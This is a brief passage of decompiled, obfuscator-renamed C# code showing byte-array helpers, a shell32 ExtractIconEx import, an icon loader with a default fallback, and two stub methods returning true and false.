		Array.Copy(byte_0, int_0, class42_0.byte_0, class42_0.int_1, int_1);
		class42_0.int_1 += int_1;
	}

	static byte[] smethod_167(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class21.smethod_149(byte_2, 2, byte_0, byte_1);
	}

	static void smethod_168(Exception exception_0, object object_0)
	{
		Class21.smethod_122(exception_0, new object[1] { object_0 });
	}

	[DllImport("shell32")]
	internal static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static Icon smethod_169()
	{
		try
		{
			return Class21.smethod_144();
		}
		catch (Exception)
		{
			return Class21.smethod_151("default");
		}
	}

	internal static bool T1fpLDgQ4dlcokqoGbL()
	{
		return true;
	}

	internal static bool Ht7G4Qg4FYYvPjn2sqY()
	{
		return false;
	}
}
